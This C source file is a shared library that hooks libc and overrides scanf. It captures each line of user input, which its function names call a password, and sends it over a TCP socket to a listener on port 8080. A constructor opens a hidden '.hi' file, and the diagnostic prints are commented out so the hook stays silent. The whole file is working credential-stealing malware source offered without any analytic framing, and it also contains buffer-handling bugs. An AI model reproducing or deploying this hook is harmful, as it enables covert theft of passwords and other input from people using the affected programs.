#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#define MAX 8096
#define PORT 8080
#define SA struct sockaddr
#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"

typedef int (*sym)(const char *, ...);
void *handle;
FILE *fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit()
{
	fd = fopen(HIDDEN_FILE, "w");
	handle = dlopen(OBJ_PATH, RTLD_LAZY);
}

void mydest()
{
	dlclose(handle);
	fclose(fd);
}
void sendPassword(int sockfd,char *password){
        char buffer[MAX];
        read(sockfd,buffer,sizeof(buffer));
        if (!strcmp("con",buffer)){
         write(sockfd,password, strlen(password));
         //printf("The password is: %s\n",password);
        }
        bzero(buffer,sizeof(buffer));
        read(sockfd,buffer,sizeof(buffer));
        if(!strcmp("recv",buffer))
          return;
}
void createClient(char * password){
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;
   
    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        //printf("socket creation failed...\n");
        //exit(0);
    }
    else
        //printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);
   
    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        //printf("connection with the server failed...\n");
        //exit(0);
    }
    else
        //printf("connected to the server..\n");
   
    // function for chat
    sendPassword(sockfd,password);
   
    // close the socket
    close(sockfd);
}
int scanf(const char *str, ...)
{
    va_list arguments;                     
    va_start ( arguments, str ); 
    char * string=va_arg( arguments, char*);
    bzero(string,sizeof(string));
	int has_val = 0,size=0;
	char s;
    char password[1000];
	while ((s = getchar()) != '\n')
	{
        password[size]=s;
        size++;
		has_val = 1;
	}
    password[size+1]='\0';
    strcat(string,password);
    createClient(password);
	if(has_val)
	{
		return 1;
	}
	return 0;
}
